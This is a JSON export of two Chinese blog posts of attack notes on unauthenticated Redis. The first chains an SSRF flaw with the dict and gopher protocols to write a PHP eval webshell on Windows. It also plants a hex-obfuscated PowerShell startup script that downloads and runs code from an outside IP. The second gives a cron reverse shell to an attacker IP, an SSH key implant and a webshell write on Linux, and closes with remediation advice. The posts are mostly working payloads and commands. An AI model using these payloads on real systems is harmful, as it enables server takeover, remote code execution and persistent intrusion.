{"posts":[{"title":"ssrf + redis（windows）未授权 getshell","content":"环境配置 windows server 2012 r2 pikachu靶场 windows_redis ssrf漏洞点 接着用试着用dict协议探测内网开放端口，本文的目标是6379端口（redis服务） 开放 验证是否存在未授权 存未授权 现有条件 1、存在ssrf漏洞 2、存在redis未授权 3、知道web目录：C:\\phpstudy_pro\\WWW\\test 那么就可以考虑getshell 利用ssrf的协议有四个：file、http、gopher、dict 本篇笔记就用 gopher 和 dict 这两个协议写shell 服务器命令写shell 用服务器上的命令行写shell演示如下图 写入成功 ssrf+dict协议+redis写shell flushall 这里目录要用16进制的\\x编码，然后再用双括号括起来 加密网址：http://www.atoolbox.net/Tool.php?Id=816 config:set:dir:&quot;\\x43\\x3a\\x5c\\x70\\x68\\x70\\x73\\x74\\x75\\x64\\x79\\x5f\\x70\\x72\\x6f\\x5c\\x57\\x57\\x57\\x5c\\x74\\x65\\x73\\x74&quot; config:set:dbfilename:dict.php 最后写webshell会遇到问题，因为如果这里的webshell内容不用16进制的\\x编码的话，会出现写shell写不进去的情况 原webshell：<?php @eval($_POST[pass]);?> 16进制\\x加密webshell：\\x3c\\x3f\\x70\\x68\\x70\\x20\\x40\\x65\\x76\\x61\\x6c\\x28\\x24\\x5f\\x50\\x4f\\x53\\x54\\x5b\\x70\\x61\\x73\\x73\\x5d\\x29\\x3b\\x3f\\x3e 还有这里不能把webshell内容用单引号括起来，要用双引号，用单引号16进制的webshell内容不会被解析 set:'webshell':&quot;\\x3c\\x3f\\x70\\x68\\x70\\x20\\x40\\x65\\x76\\x61\\x6c\\x28\\x24\\x5f\\x50\\x4f\\x53\\x54\\x5b\\x70\\x61\\x73\\x73\\x5d\\x29\\x3b\\x3f\\x3e&quot; save 用蚁剑连接webshell dict写入成功 注意_1：当我们用dict协议写shell的时候，需要将目录的绝对路径和webshell的内容用16进制的\\x进行编码，并用双引号括起来！这是为了准确性不出错！ 注意_2：当用dict协议写入启动项的时候，不论脚本格式是vbs还是bat，要保证它们顺利运行，都要将脚本内容给放到单独一行！！！ 所以我们就可以在脚本内容前后加入\\r\\n改成 set qdx &quot;\\r\\n\\r\\n\\r\\n\\x70\\x6f\\x77\\x65\\x72\\x73\\x68\\x65\\x6c\\x6c\\x2e\\x65\\x78\\x65\\x20\\x2d\\x6e\\x6f\\x70\\x20\\x2d\\x77\\x20\\x68\\x69\\x64\\x64\\x65\\x6e\\x20\\x2d\\x63\\x20\\x22\\x49\\x45\\x58\\x20\\x28\\x28\\x6e\\x65\\x77\\x2d\\x6f\\x62\\x6a\\x65\\x63\\x74\\x20\\x6e\\x65\\x74\\x2e\\x77\\x65\\x62\\x63\\x6c\\x69\\x65\\x6e\\x74\\x29\\x2e\\x64\\x6f\\x77\\x6e\\x6c\\x6f\\x61\\x64\\x73\\x74\\x72\\x69\\x6e\\x67\\x28\\x27\\x68\\x74\\x74\\x70\\x3a\\x2f\\x2f\\x31\\x31\\x38\\x2e\\x33\\x31\\x2e\\x31\\x37\\x32\\x2e\\x32\\x32\\x30\\x3a\\x34\\x32\\x32\\x33\\x31\\x2f\\x61\\x27\\x29\\x29\\x22\\r\\n\\r\\n&quot; 最终就会得到干净的脚本 ssrf+gopher协议+redis写shell gopher协议较为复杂，没有dict协议那么简易，所以这里利用工具生成基于gopher协议的payload 工具地址：https://github.com/firebroo/sec_tools 首先编辑 *\\ec_tools-master\\redis-over-gopher 目录下的redis.cmd的内容 flushall config set dir C:\\phpstudy_pro\\WWW\\test config set dbfilename gopher.php set 'webshell' '<?php @eval($_POST[pass]);)?>' save 接着运行同目录下面的 redis-over-gopher.py 生成payload gopher%3A%2F%2F127.0.0.1%3A6379%2F_%252a%2531%250d%250a%2524%2538%250d%250a%2566%256c%2575%2573%2568%2561%256c%256c%250d%250a%252a%2534%250d%250a%2524%2536%250d%250a%2563%256f%256e%2566%2569%2567%250d%250a%2524%2533%250d%250a%2573%2565%2574%250d%250a%2524%2533%250d%250a%2564%2569%2572%250d%250a%2524%2532%2537%250d%250a%2543%253a%255c%255c%2570%2568%2570%2573%2574%2575%2564%2579%255f%2570%2572%256f%255c%255c%2557%2557%2557%255c%255c%2574%2565%2573%2574%250d%250a%252a%2534%250d%250a%2524%2536%250d%250a%2563%256f%256e%2566%2569%2567%250d%250a%2524%2533%250d%250a%2573%2565%2574%250d%250a%2524%2531%2530%250d%250a%2564%2562%2566%2569%256c%2565%256e%2561%256d%2565%250d%250a%2524%2531%2530%250d%250a%2567%256f%2570%2568%2565%2572%252e%2570%2568%2570%250d%250a%252a%2533%250d%250a%2524%2533%250d%250a%2573%2565%2574%250d%250a%2524%2538%250d%250a%2577%2565%2562%2573%2568%2565%256c%256c%250d%250a%2524%2532%2538%250d%250a%253c%253f%2570%2568%2570%2520%2540%2565%2576%2561%256c%2528%2524%255f%2550%254f%2553%2554%255b%2570%2561%2573%2573%255d%2529%253b%253f%253e%250d%250a%252a%2531%250d%250a%2524%2534%250d%250a%2573%2561%2576%2565%250d%250a 最后将二次编码的payload放入url，直接发送 500错误，这不是问题啊哈，这是执行成功 用蚁剑连接 写入成功 这个工具个人认为只适合写简短的一句话，不适合写启动项之类的，暂时来讲我现在认为dict协议比这个gopher协议好用 总结 总的来说，在服务器是windows情况下，如果同时存在redis和ssrf情况下，就可以直接写shell，可用dict、gopher两个协议 经过两天的试验，在存在 ssrf + redis未授权 情况下，dict协议比gopher协议做的事情多，dict可以写shell、启动项 learn from https://blog.csdn.net/weixin_36064196/article/details/114470727 https://blog.csdn.net/qq_44159028/article/details/117034100?utm_medium=distribute.pc_relevant_t0.none-task-blog-2%7Edefault%7ECTRLIST%7Edefault-1.no_search_link&amp;depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2%7Edefault%7ECTRLIST%7Edefault-1.no_search_link ","link":"https://cherry-cheeks.github.io/post/ssrf-rediswindowswei-shou-quan-getshell/"},{"title":"test","content":"一、说明 二、搭建redis（以下均为命令） 三、利用条件 三、redis未授权利用 、脚本利用 五、修复方案： 一、说明 redis是一款开源数据库，redis因配置不当可造成未授权访问，从而造成信息泄露，如果redis以root身份运行，可以给root账户写入ssh公钥文件，从而直接通过ssh免密登录受害者服务器 二、搭建redis（linux） 1、wget http://download.redis.io/releases/redis-2.8.17.tar.gz(centos需要安装gcc ： yum install -y gcc) 2、tar xzf redis-2.8.17.tar.gz 3、cd redis-2.8.17 4、make 5、cd src 6、cp redis-server /usr/bin 7、cp redis-cli /usr/bin 8、cd ../ 9、cp redis.conf /etc 10、cat /etc/redis.conf over 三、利用条件 允许远程登录 保护模式关闭 没有设置密码 防火墙关闭 三、redis未授权利用 1、redis反弹shell（攻击机118.31.172.220，受害机108.61.162.2） 首先要在攻击机上监听8855端口：nc -lvnp 8855 然后再在攻击机上输入如下命令： A、redis-cli -h 108.61.162.2 B、set xx &quot;\\n * * * * bash -i &gt;&amp; /dev/tcp/118.31.172.220/8855 0&gt;&amp;1\\n&quot; C、config set dir /var/spool/cron D、config set dbfilename root E、save emmm，命令没问题，但是没有反弹成功 2、redis写入公钥（攻击机118.31.172.220，受害机108.61.162.2） 首先攻击机输入命令：ssh-key -t rsa，然后一直回车（在本地生成公钥，在/root/.ssh目录下面） 然后查看公钥命令：cat /root/.ssh/id_rsa.pub 记住，这里公钥后面要用到 接下来在攻击机中进入受害机redis-cli：redis-cli -h 108.61.162.2 执行命令： config set dir /root/.ssh config set dbfilename authorized_keys set x &quot;\\n\\n\\n公钥\\n\\n\\n&quot;（这里公钥的两边各有3个\\n） save ok后，直接用命令“ssh -i id_rsa root@108.61.162.2”免密登录受害机 3、redis写入webshell（攻击机108.61.162.2，受害机118.31.172.220） 条件：服务器开着web服务，可以拥有写入权限，并且redis权限较低 攻击机执行命令： redis-cli -h 118.31.172.220 config set dir /var/www/html/ config set dbfilename webshell.php set x &quot;\\n\\n\\n<?php phpinfo();?>\\n\\n\\n&quot; save over 、脚本利用 https://github.com/n0b0dyCN/redis-rogue-server https://github.com/r35tart/RedisWriteFile（推荐） 五、修复方案： 开启保护模式 限制ip登录（在redis.conf中，将bind 127.0.0.1前面的#去掉） 添加密码（在redis.conf中，搜索requirepass，后面跟密码：requirepass admin，密码admin，然后登录就redis-cli -a admin） 修改端口号在redis.conf中，port 8800 端口设置为8800或者redis-server --port 8800） 注：限制ip登录个人感觉更直接更管用 ","link":"https://cherry-cheeks.github.io/post/test/"}]}